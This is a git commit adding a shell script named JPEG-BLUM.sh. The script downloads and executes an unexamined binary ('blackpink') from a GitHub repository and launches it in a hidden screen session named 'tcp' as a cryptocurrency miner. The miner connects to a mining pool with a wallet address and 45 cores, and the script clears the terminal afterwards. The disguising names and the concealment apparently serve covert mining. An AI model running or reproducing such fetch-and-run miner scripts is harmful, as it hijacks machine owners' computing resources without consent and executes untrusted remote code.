b495f80aebab4cca13be3cc5b686615d77ea7dca
obisumila <obisumila@gmail.com>
2024-09-22 08:23:44 +0800

    Add files via upload

---
+++ JPEG-BLUM.sh
@@ -0,0 +1,20 @@
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S tcp -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username Egz4PAa5q3EYR9DpiWu5hDKe6UKaB84NsANAmHRE1k8C.SAFE --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/literate-spoon/raw/refs/heads/main/blackpink ;
+chmod +x blackpink ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S tcp -dm ./blackpink --url ws://tw-pool.com:5487/mine mine --username Egz4PAa5q3EYR9DpiWu5hDKe6UKaB84NsANAmHRE1k8C.CARE --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
